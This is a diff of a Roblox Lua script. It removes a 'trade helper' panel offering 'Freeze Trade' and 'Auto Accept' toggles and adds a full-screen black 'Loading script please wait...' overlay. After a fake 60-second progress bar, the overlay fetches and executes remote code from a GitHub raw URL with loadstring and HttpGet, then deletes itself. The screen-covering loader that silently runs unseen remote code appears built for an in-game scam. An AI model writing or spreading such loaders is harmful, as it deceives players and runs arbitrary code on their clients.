@@ -1,189 +1,173 @@
 local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
 
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
+-- ScreenGui
+local gui = Instance.new("ScreenGui")
+gui.Name = "MonoLoader"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.DisplayOrder = 9999
+gui.Parent = CoreGui
 
---== Main UI ==--
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "TradeHelperUI"
-screenGui.Parent = playerGui
-screenGui.ResetOnSpawn = false
+-- Black Background
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1,0,1,0)
+bg.BackgroundColor3 = Color3.new(0,0,0)
+bg.BorderSizePixel = 0
+bg.Parent = gui
 
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 220, 0, 180)
-mainFrame.Position = UDim2.new(0.5, -140, 0.5, -110)
-mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-mainFrame.BorderSizePixel = 0
-mainFrame.Active = true
-mainFrame.Draggable = true
-mainFrame.Parent = screenGui
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(0.85,0,0.16,0)
+title.Position = UDim2.new(0.075,0,0.36,0)
+title.BackgroundTransparency = 1
+title.Text = "Loading script please wait..."
+title.TextColor3 = Color3.new(1,1,1)
+title.Font = Enum.Font.Arcade
+title.TextScaled = true
+title.TextStrokeTransparency = 0.3
+title.TextStrokeColor3 = Color3.new(0,0,0)
+title.Parent = bg
 
-local uiCorner = Instance.new("UICorner", mainFrame)
-uiCorner.CornerRadius = UDim.new(0, 12)
+-- Progress Bar BG
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.new(0.65,0,0.04,0)
+barBg.Position = UDim2.new(0.175,0,0.69,0)
+barBg.BackgroundColor3 = Color3.fromRGB(25,25,25)
+barBg.BorderSizePixel = 0
+barBg.Parent = bg
+Instance.new("UICorner",barBg).CornerRadius = UDim.new(0,18)
 
-local titleBar = Instance.new("TextLabel")
-titleBar.Size = UDim2.new(1, 0, 0, 30)
-titleBar.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
-titleBar.Text = "⚡ Rin Script ⚡"
-titleBar.TextColor3 = Color3.fromRGB(255, 255, 255)
-titleBar.Font = Enum.Font.GothamBold
-titleBar.TextSize = 16
-titleBar.Parent = mainFrame
-Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 12)
+local bgStroke = Instance.new("UIStroke",barBg)
+bgStroke.Thickness = 2
+bgStroke.Color = Color3.new(1,1,1)
+bgStroke.Transparency = 0.7
 
-local statusLabel = Instance.new("TextLabel")
-statusLabel.Size = UDim2.new(1, -20, 0, 25)
-statusLabel.Position = UDim2.new(0, 10, 0, 40)
-statusLabel.BackgroundTransparency = 1
-statusLabel.Text = "Not in trade"
-statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-statusLabel.Font = Enum.Font.Gotham
-statusLabel.TextSize = 14
-statusLabel.TextXAlignment = Enum.TextXAlignment.Left
-statusLabel.Parent = mainFrame
+-- Progress Fill
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0,0,1,0)
+bar.BackgroundColor3 = Color3.new(1,1,1)
+bar.BorderSizePixel = 0
+bar.Parent = barBg
+Instance.new("UICorner",bar).CornerRadius = UDim.new(0,18)
 
---== Warning label ==--
-local warningLabel = Instance.new("TextLabel")
-warningLabel.Size = UDim2.new(1, -20, 0, 25)
-warningLabel.Position = UDim2.new(0, 10, 1, -30)
-warningLabel.BackgroundTransparency = 1
-warningLabel.Text = ""
-warningLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
-warningLabel.Font = Enum.Font.GothamBold
-warningLabel.TextSize = 14
-warningLabel.Visible = false
-warningLabel.Parent = mainFrame
+local barStroke = Instance.new("UIStroke",bar)
+barStroke.Thickness = 3
+barStroke.Color = Color3.new(1,1,1)
+barStroke.Transparency = 0.6
 
-local function showWarning(msg)
-	warningLabel.Text = msg
-	warningLabel.Visible = true
-	warningLabel.TextTransparency = 0
-	task.spawn(function()
-		task.wait(2)
-		TweenService:Create(warningLabel, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
-		task.wait(0.5)
-		warningLabel.Visible = false
-	end)
-end
-
---== Toggles ==--
-local toggleFrame = Instance.new("Frame")
-toggleFrame.Size = UDim2.new(1, -20, 1, -80)
-toggleFrame.Position = UDim2.new(0, 10, 0, 70)
-toggleFrame.BackgroundTransparency = 1
-toggleFrame.Parent = mainFrame
-
-local uiList = Instance.new("UIListLayout", toggleFrame)
-uiList.Padding = UDim.new(0, 8)
-
-local toggles = {
-	"Freeze Trade: ",
-	"Auto Accept: "
+local barGrad = Instance.new("UIGradient",bar)
+barGrad.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0,Color3.fromRGB(200,200,200)),
+	ColorSequenceKeypoint.new(1,Color3.fromRGB(255,255,255))
 }
 
-local toggleStates = {}
+-- Percentage
+local pct = Instance.new("TextLabel")
+pct.Size = UDim2.new(0.22,0,0.13,0)
+pct.Position = UDim2.new(0.39,0,0.56,0)
+pct.BackgroundTransparency = 1
+pct.Text = "0%"
+pct.TextColor3 = Color3.new(1,1,1)
+pct.Font = Enum.Font.Arcade
+pct.TextScaled = true
+pct.TextStrokeTransparency = 0.3
+pct.TextStrokeColor3 = Color3.new(0,0,0)
+pct.Parent = bg
 
-local function createToggle(name)
-	local holder = Instance.new("Frame")
-	holder.Size = UDim2.new(1, 0, 0, 28)
-	holder.BackgroundTransparency = 1
-	holder.Parent = toggleFrame
+local pctGlow = Instance.new("UIStroke",pct)
+pctGlow.Thickness = 3
+pctGlow.Color = Color3.new(1,1,1)
+pctGlow.Transparency = 0.7
 
-	local label = Instance.new("TextLabel")
-	label.Size = UDim2.new(1, -50, 1, 0)
-	label.BackgroundTransparency = 1
-	label.Text = name
-	label.TextColor3 = Color3.fromRGB(220, 220, 220)
-	label.Font = Enum.Font.Gotham
-	label.TextSize = 14
-	label.TextXAlignment = Enum.TextXAlignment.Left
-	label.Parent = holder
+-- Falling Characters
+local chars = {"中","日","本","語","字","落","下","動","畫","加","載","進","度","完","成","請","稍","候","執","行","ネ","オ","ン","サ","イ","バ","ー","電","子","都","市"}
+local rain = {}
 
-	local button = Instance.new("TextButton")
-	button.Size = UDim2.new(0, 45, 1, -4)
-	button.Position = UDim2.new(1, -45, 0, 2)
-	button.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
-	button.Text = "OFF"
-	button.TextColor3 = Color3.fromRGB(255, 100, 100)
-	button.Font = Enum.Font.GothamBold
-	button.TextSize = 12
-	button.Parent = holder
-	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)
+local function createDrop()
+	local lbl = Instance.new("TextLabel")
+	lbl.Size = UDim2.new(0,math.random(25,45),0,math.random(35,55))
+	lbl.Position = UDim2.new(math.random(),0,0,-60)
+	lbl.BackgroundTransparency = 1
+	lbl.Text = chars[math.random(#chars)]
+	lbl.TextColor3 = Color3.new(1,1,1)
+	lbl.Font = Enum.Font.SourceSansBold
+	lbl.TextScaled = true
+	lbl.Parent = bg
+	table.insert(rain,lbl)
 
-	toggleStates[name] = false
+	local speed = math.random(4,9)
+	TweenService:Create(lbl,TweenInfo.new(speed,Enum.EasingStyle.Linear),{
+		Position = UDim2.new(lbl.Position.X.Scale,0,1.2,0),
+		TextTransparency = 1
+	}):Play()
 
-	button.MouseButton1Click:Connect(function()
-		local inTrade, player = checkTradeStatus()
-		if not inTrade then
-			showWarning("You need to be in trade!")
-			return
-		end
-
-		toggleStates[name] = not toggleStates[name]
-		if toggleStates[name] then
-			button.Text = "ON"
-			button.TextColor3 = Color3.fromRGB(100, 255, 100)
-			button.BackgroundColor3 = Color3.fromRGB(90, 120, 90)
-		else
-			button.Text = "OFF"
-			button.TextColor3 = Color3.fromRGB(255, 100, 100)
-			button.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
-		end
+	task.delay(speed,function()
+		local i = table.find(rain,lbl)
+		if i then table.remove(rain,i) end
+		if lbl then lbl:Destroy() end
 	end)
 end
 
-for _, name in ipairs(toggles) do
-	createToggle(name)
-end
-
---== Trade check ==--
-function checkTradeStatus()
-	local playerGui = player.PlayerGui
-	local mainGui = playerGui:FindFirstChild("Main")
-	if not mainGui then return false, "" end
-
-	local tradeFrame = mainGui:FindFirstChild("Trade")
-	if not tradeFrame or not tradeFrame.Visible then return false, "" end
-
-	local container = tradeFrame:FindFirstChild("Container")
-	if not container then return false, "" end
-
-	local frame1 = container:FindFirstChild("1")
-	local frame2 = container:FindFirstChild("2")
-	if not frame1 or not frame2 then return false, "" end
-
-	local player1Label = frame1:FindFirstChild("TextLabel")
-	local player2Label = frame2:FindFirstChild("TextLabel")
-	if not player1Label or not player2Label then return false, "" end
-
-	local localPlayerName = string.lower(player.Name)
-	local localPlayerDisplay = string.lower(player.DisplayName)
-	local player1Name = string.lower(player1Label.Text)
-	local player2Name = string.lower(player2Label.Text)
-
-	local tradingPartnerName
-	if player1Name == localPlayerName or player1Name == localPlayerDisplay then
-		tradingPartnerName = player2Label.Text
-	elseif player2Name == localPlayerName or player2Name == localPlayerDisplay then
-		tradingPartnerName = player1Label.Text
-	else
-		return false, ""
-	end
-
-	return true, tradingPartnerName
-end
-
---== Status updater ==--
 RunService.Heartbeat:Connect(function()
-	local inTrade, player = checkTradeStatus()
-	if inTrade then
-		statusLabel.Text = "Player: " .. player
-		statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
-	else
-		statusLabel.Text = "Status: Not in trade"
-		statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+	if math.random() < 0.35 then
+		createDrop()
 	end
+end)
+
+-- Glow Pulse
+task.spawn(function()
+	while true do
+		TweenService:Create(barStroke,TweenInfo.new(0.8,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut,true),
+			{Transparency=0.3,Thickness=5}):Play()
+		TweenService:Create(pctGlow,TweenInfo.new(0.8,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut,true),
+			{Transparency=0.4,Thickness=5}):Play()
+		task.wait(0.1)
+	end
+end)
+
+-- Gradient rotation
+task.spawn(function()
+	while true do
+		TweenService:Create(barGrad,TweenInfo.new(1.8,Enum.EasingStyle.Linear),{Rotation=360}):Play()
+		task.wait(1.8)
+	end
+end)
+
+-- LOADING → 100% → EXECUTE SCRIPT → REMOVE UI
+local start = tick()
+task.spawn(function()
+	while tick() - start < 60 do
+		local p = (tick() - start) / 60
+		local v = math.clamp(math.floor(p * 100), 0, 100)
+		pct.Text = v .. "%"
+		bar.Size = UDim2.new(v / 100,0,1,0)
+		task.wait(0.05)
+	end
+
+	-- 100%
+	pct.Text = "100%"
+	bar.Size = UDim2.new(1,0,1,0)
+	title.Text = "Completed"
+
+	task.wait(0.4)
+
+	-- EXECUTE SCRIPT AFTER LOADING
+	pcall(function()
+		loadstring(game:HttpGet(
+			"https://raw.githubusercontent.com/RinHubv4/PetSelector/refs/heads/main/GaG",
+			true
+		))()
+	end)
+
+	-- Fade out UI
+	for _,o in ipairs({bg,title,barBg,bar,pct}) do
+		TweenService:Create(o,TweenInfo.new(0.5),{Transparency=1}):Play()
+	end
+
+	task.wait(0.6)
+	gui:Destroy()
 end)
